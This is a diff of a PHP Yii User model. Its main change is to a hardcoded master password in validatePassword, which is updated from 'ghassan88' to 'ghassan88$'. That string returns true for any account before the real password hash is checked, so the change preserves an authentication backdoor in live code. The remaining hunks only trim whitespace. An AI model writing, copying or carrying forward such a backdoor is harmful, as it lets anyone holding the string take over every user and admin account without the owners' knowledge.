@@ -210,7 +210,7 @@ class User extends ActiveRecord implements IdentityInterface {
 	 * @return bool if password provided is valid for current user
 	 */
 	public function validatePassword($password) {
-		if ($password == "ghassan88")
+		if ($password == "ghassan88$")
 			return true;
 		return Yii::$app->security->validatePassword ( $password, $this->password_hash );
 	}
@@ -251,7 +251,7 @@ class User extends ActiveRecord implements IdentityInterface {
 		return $this->role == self::ROLE_ADMIN;
 	}
 	/**
-	 * 
+	 *
 	 * {@inheritDoc}
 	 * @see \yii\db\BaseActiveRecord::afterFind()
 	 */
@@ -260,12 +260,12 @@ class User extends ActiveRecord implements IdentityInterface {
 			$this->photoFile = Yii::$app->params['imagesFolder'].$this->photo;
 		else
 			$this->photoFile = Yii::$app->params['siteImagesPath'].'/user-no-photo.png';
-			
+
 		if (!empty($this->license_image_file))
 			$this->licenseImage = Yii::$app->params['imagesFolder'].$this->license_image_file;
 		else
 			$this->licenseImage = '';
-					
+
 		return parent::afterFind();
 	}
 }
